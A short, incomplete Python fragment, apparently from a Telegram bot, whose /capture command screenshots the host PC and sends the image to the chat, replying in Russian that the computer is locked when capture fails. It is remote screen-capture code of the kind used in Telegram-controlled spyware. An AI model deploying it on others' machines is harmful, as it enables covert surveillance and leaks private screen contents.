import pyautogui as pyautogui

@bot.message_handler(commands=["capture"])
def capture_pc(message):
    bot.send_chat_action(message.chat.id, 'upload_photo')
    try:
        filename = f"{time.time()}.jpg"
        pyautogui.screenshot(filename)
        with open(filename, "rb") as img:
            bot.send_photo(message.chat.id, img)
        os.remove(filename)
    except:
        bot.send_message(message.chat.id, "Компьютер заблокирован")
